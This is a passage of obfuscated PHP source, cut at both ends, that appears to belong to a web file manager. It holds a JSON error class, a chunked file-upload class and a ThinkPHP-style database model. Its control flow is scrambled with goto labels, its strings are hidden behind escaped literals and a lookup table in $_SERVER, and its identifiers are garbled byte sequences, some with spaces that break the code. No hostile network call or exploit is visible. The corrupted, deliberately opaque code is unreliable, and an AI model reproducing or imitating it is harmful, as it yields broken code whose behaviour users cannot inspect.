elseif (reset($FÎ‚ ÔË¦¥) == SERVICES_JSON_IN_OBJ) { return $FÓëÁ š‹; } goto céÈîÍ‚Ë„; céÈîÍ‚Ë„: } } } function isError($BÅÓŞ…½ÆÑ, $e±ğ¦ÛÇ®¬ = null) { $D©ÊÎî á– =& $_SERVER[¦·]; if (class_exists($D©ÊÎî á–[1971])) { return PEAR::isError($BÅÓŞ…½ÆÑ, $e±ğ¦ÛÇ®¬); } elseif (is_object($BÅÓŞ…½ÆÑ) && (get_class($BÅÓŞ…½ÆÑ) == $D©ÊÎî á–[1972] || is_subclass_of($BÅÓŞ…½ÆÑ, $D©ÊÎî á–[1972]))) { return !0; } return !1; } } if (class_exists($_SERVER[¦·][1973])) { class Services_JSON_Error extends PEAR_Error { function __construct($DÄÌ·Ğøì¹ = "\165\x6e\153\156\157\167\x6e\x20\x65\162\x72\157\x72", $BƒŠ¨¼‡¦å = null, $fºÁ¡ïÆƒ = null, $fÚÀ¹ãŒ¤Ú = null, $cÊç©¶¼¹î = null) { parent::PEAR_Error($DÄÌ·Ğøì¹, $BƒŠ¨¼‡¦å, $fºÁ¡ïÆƒ, $fÚÀ¹ãŒ¤Ú, $cÊç©¶¼¹î); } } } else { class Services_JSON_Error { function __construct($EĞõçˆÔ = "\165\156\153\x6e\x6f\167\x6e\40\145\162\162\157\x72", $d˜—‰ŞÈ· = null, $a²‹¦Ô´Ğ = null, $D÷ŒÅÂá²Í = null, $E³Ìã‹¾‘Ø = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto Eì´¤±å•Ê; Eì´¤±å•Ê: $c¿Í¬Â•Õˆ =& $_SERVER[¦·]; global $in; $this->in =& $in; goto c¢™İÇİ©«; c¢™İÇİ©«: if (!empty($_FILES)) { $B”ƒñ¡ùì = $_FILES[$c¿Í¬Â•Õˆ[167]]; $this->uploadFile = $B”ƒñ¡ùì[$c¿Í¬Â•Õˆ[1974]]; if (!$this->uploadFile && $B”ƒñ¡ùì[$c¿Í¬Â•Õˆ[1223]] > 0) { show_json($this->errorInfo($B”ƒñ¡ùì[$c¿Í¬Â•Õˆ[1223]]), !1); } } else { if (isset($in[$c¿Í¬Â•Õˆ[386]])) { $this->uploadFile = isset($in[$c¿Í¬Â•Õˆ[1975]]) ? $c¿Í¬Â•Õˆ[1976] : $c¿Í¬Â•Õˆ[1819]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto e˜ŠƒÓƒÉ®; e˜ŠƒÓƒÉ®: $this->checkSize(); $this->tempPathInit(); goto bª‚‡¾ù; bª‚‡¾ù: } public function upload() { goto aØ’É¾³¸Î; aØ’É¾³¸Î: $eµÒÕœÂáë =& $_SERVER[¦·]; $b«¼„ñöğÜ = isset($this->in[$eµÒÕœÂáë[1977]]) ? intval($this->in[$eµÒÕœÂáë[1977]]) : 0; $bƒîÀå×¼ = isset($this->in[$eµÒÕœÂáë[1978]]) ? intval($this->in[$eµÒÕœÂáë[1978]]) : 1; goto B±„åâå‡£; e¸Ìª¤¾á–: $FŞ™¹ ¾¹à[$eµÒÕœÂáë[1987]][$eµÒÕœÂáë[1988] . $b«¼„ñöğÜ] = array($eµÒÕœÂáë[1989] => $FöÏ®íÎ©Ã, $eµÒÕœÂáë[1039] => $b«¼„ñöğÜ, $eµÒÕœÂáë[77] => $c…“†ò÷’, $eµÒÕœÂáë[164] => $fÉ›æŠ£Œ); $this->statusSet($FŞ™¹ ¾¹à); if (count($FŞ™¹ ¾¹à[$eµÒÕœÂáë[1987]]) != $FŞ™¹ ¾¹à[$eµÒÕœÂáë[1986]]) { $this->showJson($eµÒÕœÂáë[1990] . $b«¼„ñöğÜ, !0); } goto AÏ½¾ÇÚŸ‘; eÖÍ¨‡‹¥«: $FöÏ®íÎ©Ã = $b«¼„ñöğÜ * $fÙ›«ÍĞğ; $DƒšñªóÌÊ = @fopen($this->tempFile, $eµÒÕœÂáë[1984]); fseek_64($DƒšñªóÌÊ, $FöÏ®íÎ©Ã); goto e‰Ö¢ƒ‰‡³; C±à³é¹ÒÀ: $C‰Ïšˆ… = $this->moveUploadedFile($CÅ‰Í¿è¢Õ); if ($c…“†ò÷’ > 0 && filesize($C‰Ïšˆ…) == 0) { $this->showJson($eµÒÕœÂáë[1982], !1); } if (!$C‰Ïšˆ…) { $this->showJson(LNG($eµÒÕœÂáë[1983]), !1); } goto eÖÍ¨‡‹¥«; F†¨¼™õ½²: if ($bƒîÀå×¼ > 1 && $fÙ›«ÍĞğ <= 0) { show_json($eµÒÕœÂáë[1981], !1); } if ($fÙ›«ÍĞğ > $c…“†ò÷’) { $bƒîÀå×¼ = 1; } if ($bƒîÀå×¼ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto BÉƒ–ËÁï; e‰Ö¢ƒ‰‡³: $dâ£¥…ìï = $this->writeTo($C‰Ïšˆ…, $DƒšñªóÌÊ, $this->tempFile); $fÉ›æŠ£Œ = IO::hashSimple($C‰Ïšˆ…); $c…“†ò÷’ = IO::size($C‰Ïšˆ…); goto aÇÄİ¤ñÑå; BÉƒ–ËÁï: CacheLock::lock($this->tempFile, 20); $FŞ™¹ ¾¹à = $this->statusGet(); $this->initFileTemp(); goto C±à³é¹ÒÀ; aÇÄİ¤ñÑå: @unlink($C‰Ïšˆ…); if (!$dâ£¥…ìï) { $this->showJson($eµÒÕœÂáë[1985] . $b«¼„ñöğÜ, !1); } $FŞ™¹ ¾¹à[$eµÒÕœÂáë[1986]] = $bƒîÀå×¼; goto e¸Ìª¤¾á–; F‹àø‘ëä»: CacheLock::unlock($this->tempFile); return $this->tempFile; goto døí±×‹; AÏ½¾ÇÚŸ‘: ignore_timeout(); if (!$this->checkChunkHash($FŞ™¹ ¾¹à)) { $this->showJson($eµÒÕœÂáë[1991], !1); } $this->statusSet(!1); goto F‹àø‘ëä»; B±„åâå‡£: $CÅ‰Í¿è¢Õ = $this->tempFile . $eµÒÕœÂáë[1979] . $b«¼„ñöğÜ; $c…“†ò÷’ = isset($this->in[$eµÒÕœÂáë[522]]) ? intval($this->in[$eµÒÕœÂáë[522]]) : 0; $fÙ›«ÍĞğ = isset($this->in[$eµÒÕœÂáë[1980]]) ? intval($this->in[$eµÒÕœÂáë[1980]]) : 0; goto F†¨¼™õ½²; døí±×‹: } private function checkSize() { $E÷ß—èéÌ› =& $_SERVER[¦·]; if (phpBuild64() || $this->in[$E÷ß—èéÌ›[77]] < PHP_INT_MAX) { return; } show_json(LNG($E÷ß—èéÌ›[1992]), !1); } private function showJson($B·äİ…‡Ê§, $a¤ƒ„ò©Í’) { CacheLock::unlock($this->tempFile); if (!$a¤ƒ„ò©Í’) { return show_json($B·äİ…‡Ê§, $a¤ƒ„ò©Í’); } show_json($B·äİ…‡Ê§, $a¤ƒ„ò©Í’); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto DÎá®½„ÇÊ; Bº¦Ø³³š¼: touch($Aßó¶ô‘Ô” . $añÂ˜˜¿‰˜[1993]); $d¢° õ‡›š = isset($this->in[$añÂ˜˜¿‰˜[1994]]) ? $this->in[$añÂ˜˜¿‰˜[1994]] : !1; if (strlen($d¢° õ‡›š) < 30) { $d¢° õ‡›š = md5(USER_ID . $this->in[$añÂ˜˜¿‰˜[75]] . $this->fileName . $this->in[$añÂ˜˜¿‰˜[77]]); } goto F âÅåíŒì; F âÅåíŒì: $this->tempFile = $Aßó¶ô‘Ô” . $añÂ˜˜¿‰˜[1995] . md5($d¢° õ‡›š . $this->in[$añÂ˜˜¿‰˜[1536]]); goto Cêº´Çš¥¢; DÎá®½„ÇÊ: $añÂ˜˜¿‰˜ =& $_SERVER[¦·]; $Aßó¶ô‘Ô” = TEMP_FILES; @mk_dir($Aßó¶ô‘Ô”); goto Bº¦Ø³³š¼; Cêº´Çš¥¢: } private function moveUploadedFile($F˜¡£÷¿ì) { $fß÷ÂÏ„ =& $_SERVER[¦·]; $A›Â‰¾×êÏ = $this->uploadFile; if ($A›Â‰¾×êÏ == $fß÷ÂÏ„[1996]) { @file_put_contents($F˜¡£÷¿ì, base64_decode($_REQUEST[$fß÷ÂÏ„[1997]])); } else { if ($A›Â‰¾×êÏ == $fß÷ÂÏ„[1819]) { $c’ŒœÊ® = @fopen($F˜¡£÷¿ì, $fß÷ÂÏ„[1526]); $this->writeTo($A›Â‰¾×êÏ, $c’ŒœÊ®, $F˜¡£÷¿ì); } else { if (!move_uploaded_file($A›Â‰¾×êÏ, $F˜¡£÷¿ì)) { return !1; } } } return $F˜¡£÷¿ì; } private function writeTo($a©ç‰Š±È˜, $bøˆˆÖ™½—, $AëÃ„öøÎ•) { goto fçï”ÏøÏ; CŒƒÙ’ÅÔ¾: return !0; goto c­Ò°õÌ¥Ÿ; Aªª¼¬×Äˆ: $b¿¼Äñ³òï = @fopen($a©ç‰Š±È˜, $f×ë÷¢‡¯[1525]); if (!$b¿¼Äñ³òï || !$bøˆˆÖ™½— || !$EåÉÕŸò¢…) { CacheLock::unlock($DÁÆô‰±»È); return !1; } while (!feof($b¿¼Äñ³òï)) { fwrite($bøˆˆÖ™½—, fread($b¿¼Äñ³òï, 1024 * 200)); } goto Eì§¤İ­öö; fçï”ÏøÏ: $f×ë÷¢‡¯ =& $_SERVER[¦·]; $DÁÆô‰±»È = $f×ë÷¢‡¯[1998] . $AëÃ„öøÎ•; $EåÉÕŸò¢… = CacheLock::lock($DÁÆô‰±»È, 1); goto Aªª¼¬×Äˆ; Eì§¤İ­öö: fclose($b¿¼Äñ³òï); fclose($bøˆˆÖ™½—); CacheLock::unlock($DÁÆô‰±»È); goto CŒƒÙ’ÅÔ¾; c­Ò°õÌ¥Ÿ: } private function statusGet() { goto C £ÀÖªÔ×; C £ÀÖªÔ×: $c™†›Õ½æ× =& $_SERVER[¦·]; if (is_array($this->statusData)) { return $this->statusData; } $d³¥²Ê½Ğò = $this->tempFile . $c™†›Õ½æ×[1999]; goto FŞÛ˜‰­¸È; fˆÏïˆ­÷: if (!$this->statusData) { $F¼ï…õ»ƒ· = array($c™†›Õ½æ×[28] => $this->fileName, $c™†›Õ½æ×[1986] => 0, $c™†›Õ½æ×[1987] => array()); $this->statusSet($F¼ï…õ»ƒ·); } return $this->statusData; goto DŞôäÌ³É; FŞÛ˜‰­¸È: $dƒÅ™•ò ç = !1; if (file_exists($d³¥²Ê½Ğò)) { $dƒÅ™•ò ç = @file_get_contents($d³¥²Ê½Ğò); } if ($dƒÅ™•ò ç) { $this->statusData = json_decode($dƒÅ™•ò ç, !0); } goto fˆÏïˆ­÷; DŞôäÌ³É: } public function statusSet($dµ°åæø) { $D˜ˆŸÛÚ¼Ò = $this->tempFile . $_SERVER[¦·][1999]; if (!$dµ°åæø) { if (file_exists($D˜ˆŸÛÚ¼Ò)) { @unlink($D˜ˆŸÛÚ¼Ò); } return !0; } $this->statusData = $dµ°åæø; return file_put_contents($D˜ˆŸÛÚ¼Ò, json_encode($dµ°åæø)); } private function initFileTemp() { $aùÀÄ¦®™ =& $_SERVER[¦·]; if (file_exists($this->tempFile)) { return; } $EÆÊ™°† = fopen($this->tempFile, $aùÀÄ¦®™[2000]); fseek_64($EÆÊ™°†, $this->in[$aùÀÄ¦®™[77]] - 1, SEEK_SET); fwrite($EÆÊ™°†, $aùÀÄ¦®™[470]); fclose($EÆÊ™°†); } public function checkChunk() { goto CÔÇ¡Ù›«; a»‹æ—ìòö: return $b‚»İ”¥À­; goto cÎº”Œ§‰å; CÔÇ¡Ù›«: $fÔÔ‹ÚïŠ =& $_SERVER[¦·]; $b‚»İ”¥À­ = array(); CacheLock::lock($this->tempFile); goto EğˆÚã«ÍÃ; EğˆÚã«ÍÃ: $EìÄ£Ï˜µä = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($EìÄ£Ï˜µä[$fÔÔ‹ÚïŠ[1987]] as $d¹’È÷‘Û) { $f¹µ‡ğ‹Ğ¨ = $d¹’È÷‘Û[$fÔÔ‹ÚïŠ[164]]; if ($f¹µ‡ğ‹Ğ¨) { $b‚»İ”¥À­[$fÔÔ‹ÚïŠ[2001] . $d¹’È÷‘Û[$fÔÔ‹ÚïŠ[1039]]] = $f¹µ‡ğ‹Ğ¨; } } goto a»‹æ—ìòö; cÎº”Œ§‰å: } private function checkChunkHash($aÛ ‚†Ğôß) { goto AÑô¿ĞµÍ; DŠê°ğïãî: $a’»Šøó = _get($this->in, $aªˆÑºÜ×[2002]); if (strlen($a’»Šøó) == 32 && IO::hashSimple($this->tempFile) == $bÒÂŸ£Êõ¿ && IO::hashMd5($this->tempFile) == $a’»Šøó) { return !0; } $d¯ĞêòÑÉ× = fopen($this->tempFile, $aªˆÑºÜ×[1174]); goto E´–á¼Ú×Ù; E´–á¼Ú×Ù: $AÅëÜ®¢áÉ = !0; foreach ($aÛ ‚†Ğôß[$aªˆÑºÜ×[1987]] as $Aáã†Ê»Ù) { fseek_64($d¯ĞêòÑÉ×, $Aáã†Ê»Ù[$aªˆÑºÜ×[1989]]); $d¤ñ½ëéÔ¢ = PathDriverStream::hash($d¯ĞêòÑÉ×, $Aáã†Ê»Ù[$aªˆÑºÜ×[77]]); if ($Aáã†Ê»Ù[$aªˆÑºÜ×[164]] != $d¤ñ½ëéÔ¢) { $AÅëÜ®¢áÉ = !1; break; } } fclose($d¯ĞêòÑÉ×); goto eÄËî¦äó; eÄËî¦äó: return $AÅëÜ®¢áÉ; goto C‡‚¬ªï; AÑô¿ĞµÍ: $aªˆÑºÜ× =& $_SERVER[¦·]; if (count($aÛ ‚†Ğôß[$aªˆÑºÜ×[1987]]) != $aÛ ‚†Ğôß[$aªˆÑºÜ×[1986]]) { return !1; } $bÒÂŸ£Êõ¿ = _get($this->in, $aªˆÑºÜ×[1994]); goto DŠê°ğïãî; C‡‚¬ªï: } public static function fileName() { goto F©ø¿ÒÎáÜ; F©ø¿ÒÎáÜ: $Eƒ¶„Æ†ˆ“ =& $_SERVER[¦·]; global $in; $FÛøï½ìçß = isset($in[$Eƒ¶„Æ†ˆ“[28]]) ? $in[$Eƒ¶„Æ†ˆ“[28]] : $Eƒ¶„Æ†ˆ“[33]; goto F…ùØ¼®Ş¡; F…ùØ¼®Ş¡: if (!empty($_FILES)) { $FÛøï½ìçß = $FÛøï½ìçß ? $FÛøï½ìçß : $_FILES[$Eƒ¶„Æ†ˆ“[167]][$Eƒ¶„Æ†ˆ“[386]]; } if (!is_wap()) { return KodIO::clear($FÛøï½ìçß); } $cŠ“©•˜Ç = strtotime($in[$Eƒ¶„Æ†ˆ“[2003]]); goto B±­ô¼ˆ¡ˆ; CœîÇŒŠÙÃ: return KodIO::clear($FÛøï½ìçß); goto a ¼ˆÌâ³; B±­ô¼ˆ¡ˆ: $cŠ“©•˜Ç = $cŠ“©•˜Ç ? $cŠ“©•˜Ç : time(); $aÄ­¯‹ç«å = strtolower($FÛøï½ìçß); if ($aÄ­¯‹ç«å == $Eƒ¶„Æ†ˆ“[2004] || $aÄ­¯‹ç«å == $Eƒ¶„Æ†ˆ“[2005]) { $FÛøï½ìçß = date($Eƒ¶„Æ†ˆ“[691], $cŠ“©•˜Ç) . $Eƒ¶„Æ†ˆ“[70] . $in[$Eƒ¶„Æ†ˆ“[77]] . $Eƒ¶„Æ†ˆ“[1633]; } else { if ($aÄ­¯‹ç«å == $Eƒ¶„Æ†ˆ“[2006]) { $FÛøï½ìçß = date($Eƒ¶„Æ†ˆ“[691], $cŠ“©•˜Ç) . $Eƒ¶„Æ†ˆ“[70] . $in[$Eƒ¶„Æ†ˆ“[77]] . $Eƒ¶„Æ†ˆ“[2007]; } } goto CœîÇŒŠÙÃ; a ¼ˆÌâ³: } private function errorInfo($F«ó¯Û­»â) { $dò˜„ôöçÕ =& $_SERVER[¦·]; $DâõÎŞ¾ÖÕ = array($dò˜„ôöçÕ[2008], $dò˜„ôöçÕ[2009], $dò˜„ôöçÕ[2010], $dò˜„ôöçÕ[2011], $dò˜„ôöçÕ[2012], $dò˜„ôöçÕ[2013], $dò˜„ôöçÕ[2014], $dò˜„ôöçÕ[2015]); return $F«ó¯Û­»â . $dò˜„ôöçÕ[4] . $DâõÎŞ¾ÖÕ[$F«ó¯Û­»â]; } } goto BİøíÍµ¾›; fé¤çÖå­Ş: register_shutdown_function($_SERVER[æªÊ«][32]); set_error_handler($_SERVER[æªÊ«][46], $E¥ˆ±ÓÙ¡Æ); if (function_exists($_SERVER[æªÊ«][47])) { set_exception_handler($_SERVER[æªÊ«][48]); } goto d¨’Ç¾œİ; Eõ»šà¾ñ„: define($_SERVER[¦·][230], 0); define($_SERVER[¦·][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\157\x72\144\145\162", "\x61\154\x69\x61\163", "\x68\141\x76\x69\156\x67", "\147\162\x6f\x75\x70", "\154\x6f\x63\153", "\144\151\x73\164\x69\156\x63\x74", "\141\165\164\157", "\146\151\154\164\145\x72", "\166\x61\154\151\144\x61\164\145", "\x72\x65\x73\x75\154\x74", "\x62\x69\156\x64", "\x74\157\x6b\x65\x6e"); public function __construct($bî†•Ù¥êç = '', $B­â¼ïŒ»© = '', $CïºĞ¹¶ø = '') { $e¸‰Áä‘Ù =& $_SERVER[¦·]; $this->_initialize(); if (!empty($bî†•Ù¥êç)) { if (strpos($bî†•Ù¥êç, $e¸‰Áä‘Ù[91])) { list($this->dbName, $this->name) = explode($e¸‰Áä‘Ù[91], $bî†•Ù¥êç); } else { $this->name = $bî†•Ù¥êç; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($B­â¼ïŒ»©)) { $this->tablePrefix = $e¸‰Áä‘Ù[33]; } elseif ($e¸‰Áä‘Ù[33] != $B­â¼ïŒ»©) { $this->tablePrefix = $B­â¼ïŒ»©; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($e¸‰Áä‘Ù[232]); } $this->db(0, empty($this->connection) ? $CïºĞ¹¶ø : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $bò·®“¤µ =& $_SERVER[¦·]; if (empty($this->fields)) { if (think_config($bò·®“¤µ[233])) { $BŠ¶ßâÊÌ© = $this->dbName ? $this->dbName : think_config($bò·®“¤µ[234]); $EÈ–Ùº¢‘ì = think_var_cache($bò·®“¤µ[235] . strtolower(get_path_this($BŠ¶ßâÊÌ©) . $bò·®“¤µ[91] . $this->name)); if ($EÈ–Ùº¢‘ì) { $fæ‰Ş†ëËÎ = think_config($bò·®“¤µ[236]); if (empty($fæ‰Ş†ëËÎ) || $EÈ–Ùº¢‘ì[$bò·®“¤µ[237]] == $fæ‰Ş†ëËÎ) { $this->fields = $EÈ–Ùº¢‘ì; return; } } } $this->flush(); } } public function flush() { goto cäÜíÂ£…º; F‚äïåŒ×Ú: if (!$fïÕ®™†Êê) { return !1; } $this->fields = array_keys($fïÕ®™†Êê); $this->fields[$C­±ã¾œ²[238]] = !1; goto a–Îõô†³; E˜Š¨Ç¸¿: if (think_config($C­±ã¾œ²[233])) { $fğöÁÒ¡ø‘ = $this->dbName ? $this->dbName : think_config($C­±ã¾œ²[234]); think_var_cache($C­±ã¾œ²[235] . strtolower(get_path_this($fğöÁÒ¡ø‘) . $C­±ã¾œ²[91] . $this->name), $this->fields); } goto cà°„õîÑ; a–Îõô†³: foreach ($fïÕ®™†Êê as $aõÈ¸µ‰Ã => $dÊù¢İìÄÈ) { $b±Èµ®Ó¸ƒ[$aõÈ¸µ‰Ã] = $dÊù¢İìÄÈ[$C­±ã¾œ²[29]]; if ($dÊù¢İìÄÈ[$C­±ã¾œ²[36]]) { $this->fields[$C­±ã¾œ²[239]] = $aõÈ¸µ‰Ã; if ($dÊù¢İìÄÈ[$C­±ã¾œ²[39]]) { $this->fields[$C­±ã¾œ²[238]] = !0; } } } $this->fields[$C­±ã¾œ²[240]] = $b±Èµ®Ó¸ƒ; if (think_config($C­±ã¾œ²[236])) { $this->fields[$C­±ã¾œ²[237]] = think_config($C­±ã¾œ²[236]); } goto E˜Š¨Ç¸¿; cäÜíÂ£…º: $C­±ã¾œ² =& $_SERVER[¦·]; $this->db->setModel($this->name); $fïÕ®™†Êê = $this->db->getFields($this->getTableName()); goto F‚äïåŒ×Ú; cà°„õîÑ: } public function switchModel($DØéŠÈéçÛ, $ašÍÙ¦¹Öø = array()) { $a ¶ªƒÚîÀ =& $_SERVER[¦·]; $e‡À÷ ª´¾ = ucwords(strtolower($DØéŠÈéçÛ)) . $a ¶ªƒÚîÀ[241]; if (!class_exists($e‡À÷ ª´¾)) { think_exception($e‡À÷ ª´¾ . think_lang($a ¶ªƒÚîÀ[242])); } $this->_extModel = new $e‡À÷ ª´¾($this->name); if (!empty($ašÍÙ¦¹Öø)) { foreach ($ašÍÙ¦¹Öø as $dîĞìé¸è”) { $this->_extModel->setProperty($dîĞìé¸è”, $this->{$dîĞìé¸è”}); } } return $this->_extModel; } public function __set($D‰¦÷±åî÷, $d‰­ªÆÈÜ) { $this->data[$D‰¦÷±åî÷] = $d‰­ªÆÈÜ; } public function __get($FÓ¶“ßŠë’) { return isset($this->data[$FÓ¶“ßŠë’]) ? $this->data[$FÓ¶“ßŠë’] : null; } public function __isset($e¢ÀÄ’º) { return isset($this->data[$e¢ÀÄ’º]); } public function __unset($Cí’ÃÛÃÀ) { unset($this->data[$Cí’ÃÛÃÀ]); } public function __call($D¯µ•Ñø¤Á, $D±¥¨Õ•‹¦) { $cèä¥Ì„ˆä =& $_SERVER[¦·]; if (in_array(strtolower($D¯µ•Ñø¤Á), $this->methods, !0)) { $this->options[strtolower($D¯µ•Ñø¤Á)] = $D±¥¨Õ•‹¦[0]; return $this; } elseif (in_array(strtolower($D¯µ•Ñø¤Á), array($cèä¥Ì„ˆä[243], $cèä¥Ì„ˆä[244], $cèä¥Ì„ˆä[245], $cèä¥Ì„ˆä[246], $cèä¥Ì„ˆä[247]), !0)) { $CÕ¾óØâ = isset($D±¥¨Õ•‹¦[0]) ? $D±¥¨Õ•‹¦[0] : $cèä¥Ì„ˆä[176]; $CÕ¾óØâ = $this->db->parseKey($CÕ¾óØâ); return $this->getField(strtoupper($D¯µ•Ñø¤Á) . $cèä¥Ì„ˆä[248] . $CÕ¾óØâ . $cèä¥Ì„ˆä[249] . $D¯µ•Ñø¤Á, $cèä¥Ì„ˆä[243]); } elseif (strtolower(substr($D¯µ•Ñø¤Á, 0, 5)) == $cèä¥Ì„ˆä[250]) { $CÕ¾óØâ = think_parse_name(substr($D¯µ•Ñø¤Á, 5)); $aº¬Å”¸²[$CÕ¾óØâ] = $D±¥¨Õ•‹¦[0]; return $this->where($aº¬Å”¸²)->find(); } elseif (strtolower(substr($D¯µ•Ñø¤Á, 0, 10)) == $cèä¥Ì„ˆä[251]) { $b·áÆ‰ÒŞ· = think_parse_name(substr($D¯µ•Ñø¤Á, 10)); $aº¬Å”¸²[$b·áÆ‰ÒŞ·] = $D±¥¨Õ•‹¦[0]; return $this->where($aº¬Å”¸²)->getField($D±¥¨Õ•‹¦[1]); } elseif (isset($this->_scope[$D¯µ•Ñø¤Á])) { return $this->scope($D¯µ•Ñø¤Á, $D±¥¨Õ•‹¦[0]); } elseif (method_exists($this, $D¯µ•Ñø¤Á)) { array_unshift($D±¥¨Õ•‹¦, $D¯µ•Ñø¤Á); return call_user_func_array(array($this, $cèä¥Ì„ˆä[252]), $D±¥¨Õ•‹¦); } else { return call_user_func_array(array(parent, $D¯µ•Ñø¤Á), $D±¥¨Õ•‹¦); } } protected function call() { goto DÒëŠéÛùí; DÒëŠéÛùí: $CØµø‹ÁÅğ =& $_SERVER[¦·]; $f´ò³Ì§ = func_get_args(); $f¡¸ÂÑ½ = array_shift($f´ò³Ì§); goto dÍâÃÃ÷Œ; EÖÕùğ¤¨Î: $Bó¬Ÿßí¯ø = call_user_func_array(array($this, $f¡¸ÂÑ½), $f´ò³Ì§); if (method_exists($this, $CØµø‹ÁÅğ[256])) { $b¥Áâ†¤ˆ‡ = call_user_func_array(array($this, $CØµø‹ÁÅğ[257]), array($CÆÜÏËÌÉË, $f´ò³Ì§, $Bó¬Ÿßí¯ø)); if ($b¥Áâ†¤ˆ‡) { return $b¥Áâ†¤ˆ‡; } } return $Bó¬Ÿßí¯ø; goto E¢¶¥Ïñôã; dÍâÃÃ÷Œ: $CÆÜÏËÌÉË = $f¡¸ÂÑ½; if (is_array($f¡¸ÂÑ½)) { $CÆÜÏËÌÉË = $f¡¸ÂÑ½[1]; $f¡¸ÂÑ½ = $f¡¸ÂÑ½[0]; } $dºÆ´İ¦à = count($f´ò³Ì§) - 1; goto eº¨íÑß±; eº¨íÑß±: if (isset($f´ò³Ì§[$dºÆ´İ¦à]) && $f´ò³Ì§[$dºÆ´İ¦à] === $f¡¸ÂÑ½) { think_exception(__CLASS__ . $CØµø‹ÁÅğ[4] . $f¡¸ÂÑ½ . think_lang($CØµø‹ÁÅğ[253])); return; } $f´ò³Ì§[] = $f¡¸ÂÑ½; if (method_exists($this, $CØµø‹ÁÅğ[254])) { $b¥Áâ†¤ˆ‡ = call_user_func_array(array($this, $CØµø‹ÁÅğ[255]), array($CÆÜÏËÌÉË, $f´ò³Ì§)); if (!is_null($b¥Áâ†¤ˆ‡) && $b¥Áâ†¤ˆ‡ !== !1) { return $b¥Áâ†¤ˆ‡; } } goto EÖÕùğ¤¨Î; E¢¶¥Ïñôã: } protected function _initialize() { } protected function _facade($FŸÀ¾èğáŒ) { $C·Ÿ›Ø÷‡º =& $_SERVER[¦·]; if (!empty($this->fields)) { foreach ($FŸÀ¾èğáŒ as $dËª“ÆŒèõ => $cîÕÛíè„) { if (!in_array($dËª“ÆŒèõ, $this->fields, !0)) { unset($FŸÀ¾èğáŒ[$dËª“ÆŒèõ]); } elseif (is_scalar($cîÕÛíè„)) { $this->_parseType($FŸÀ¾èğáŒ, $dËª“ÆŒèõ); } } } if (!empty($this->options[$C·Ÿ›Ø÷‡º[258]])) { $FŸÀ¾èğáŒ = array_map($this->options[$C·Ÿ›Ø÷‡º[258]], $FŸÀ¾èğáŒ); unset($this->options[$C·Ÿ›Ø÷‡º[258]]); } $this->_beforeWrite($FŸÀ¾èğáŒ); return $FŸÀ¾èğáŒ; } protected function _beforeWrite(&$ağŸÎŸ¡‚¹) { } public function add($fëÑ´İ‚×„ = '', $BÁÔ¤â–˜Ä = array(), $c‡áÊÏ¼•Ë = false) { goto bŒÀ‡ Ú¨­; eö‹õ­“¢æ: return $Dõ™˜íĞÛÈ; goto e¿âÛš Ï£; bêó¥ÕæÎ: if (!1 === $this->_beforeInsert($fëÑ´İ‚×„, $BÁÔ¤â–˜Ä)) { return !1; } $Dõ™˜íĞÛÈ = $this->db->insert($fëÑ´İ‚×„, $BÁÔ¤â–˜Ä, $c‡áÊÏ¼•Ë); if (!1 !== $Dõ™˜íĞÛÈ) { $bå¶ñ•Ê¡ = $this->getLastInsID(); if ($bå¶ñ•Ê¡) { $fëÑ´İ‚×„[$this->getPk()] = $bå¶ñ•Ê¡; $this->_after_insert($fëÑ´İ‚×„, $BÁÔ¤â–˜Ä); return $bå¶ñ•Ê¡; } $this->_after_insert($fëÑ´İ‚×„, $BÁÔ¤â–˜Ä); } goto eö‹õ­“¢æ; bŒÀ‡ Ú¨­: if (empty($fëÑ´İ‚×„)) { if (!empty($this->data)) { $fëÑ´İ‚×„ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¦·][259]); return !1; } } $BÁÔ¤â–˜Ä = $this->_parseOptions($BÁÔ¤â–˜Ä); $fëÑ´İ‚×„ = $this->_facade($fëÑ´İ‚×„); goto bêó¥ÕæÎ; e¿âÛš Ï£: } protected function _beforeInsert(&$Bˆ°á„«¶„, $DŒ¦¾‹¯) { } protected function _after_insert($eÛ—ï—¦Œğ, $F† ÷‹§§) { } public function addAll($dÒØøÓ›•‰, $eô¼ëäò¢è = array(), $F¨«ÑÌÕÜ = false) { goto eã—øëñ; E¥§¯š¸œ: foreach ($dÒØøÓ›•‰ as $FñÕÈ„±ğ => $F­§ÇğŸ»…) { $dÒØøÓ›•‰[$FñÕÈ„±ğ] = $this->_facade($F­§ÇğŸ»…); } if (method_exists($this->db, $DŸÄš‹ƒÕ[260])) { $CêŒ½ø›ù = $this->db->insertAll($dÒØøÓ›•‰, $eô¼ëäò¢è, $F¨«ÑÌÕÜ); } else { $this->startTrans(); foreach ($dÒØøÓ›•‰ as $FñÕÈ„±ğ => $F­§ÇğŸ»…) { $CêŒ½ø›ù = $this->db->insert($F­§ÇğŸ»…, $eô¼ëäò¢è, $F¨«ÑÌÕÜ); } $this->commit(); } if (!1 !== $CêŒ½ø›ù) { $cĞ«™Ù‰®Ô = $this->getLastInsID(); if ($cĞ«™Ù‰®Ô) { return $cĞ«™Ù‰®Ô; } } goto bİ·œè®ß; eã—øëñ: $DŸÄš‹ƒÕ =& $_SERVER[¦·]; if (empty($dÒØøÓ›•‰)) { $this->error = think_lang($DŸÄš‹ƒÕ[259]); return !1; } $eô¼ëäò¢è = $this->_parseOptions($eô¼ëäò¢è); goto E¥§¯š¸œ; bİ·œè®ß: return $CêŒ½ø›ù; goto eÚ‡¿¾Â©…; eÚ‡¿¾Â©…: } public function selectAdd($DÜĞŸÖ½ » = '', 